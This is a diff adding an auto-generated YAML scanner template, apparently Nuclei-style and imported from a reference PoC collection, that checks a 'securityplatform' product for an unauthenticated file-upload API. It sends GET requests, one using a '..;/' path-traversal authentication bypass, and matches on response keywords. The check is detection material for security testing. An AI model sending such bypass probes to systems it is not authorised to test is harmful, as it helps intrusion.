@@ -1,0 +1,25 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-securityplatform-unauth_uploadfile_api_packages
+info:
+  name: "securityplatform unauth_uploadfile_api_packages"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, securityplatform, ref-poc, uploadfile]
+  description: "由参考项目脚本静态导入：securityplatform/unauth_uploadfile_api_packages（类型 UPLOADFILE）。 原脚本另含 favicon 指纹 ['e05b47d5ce11d2f4182a964255870b76']，本引擎暂不支持 favicon 匹配。"
+http:
+  - method: GET
+    path:
+      - "/portal/ui/login"
+      - "/svm/api/v1/heartbeat/..;/..;/..;/api/packages"
+      - "/tomcatManage/index.jsp;get"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "/portal/ui/static"
+          - "/portal/common"
+          - "\"code\":\"0\""
